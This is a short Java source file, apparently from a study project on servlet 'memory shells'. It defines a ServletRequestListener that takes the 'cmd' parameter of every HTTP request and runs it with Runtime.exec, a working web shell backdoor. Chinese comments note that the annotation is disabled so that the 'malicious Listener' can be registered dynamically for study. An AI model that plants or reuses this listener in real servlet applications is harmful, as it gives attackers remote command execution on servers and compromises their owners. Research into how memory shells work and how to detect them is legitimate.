package com.madaha.codesecmemshell.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;


// 因为加上就直接注册恶意的Listener了，这里是使用 ”jsp + servlet动态注册“ 进行实现。
// 开启debug模式，我们先来看一下调用栈。用于判断是怎么实现的动态添加Listener（ServletRequestListener）对象。

//@WebListener
public class Shell_Listener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e){
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}
}
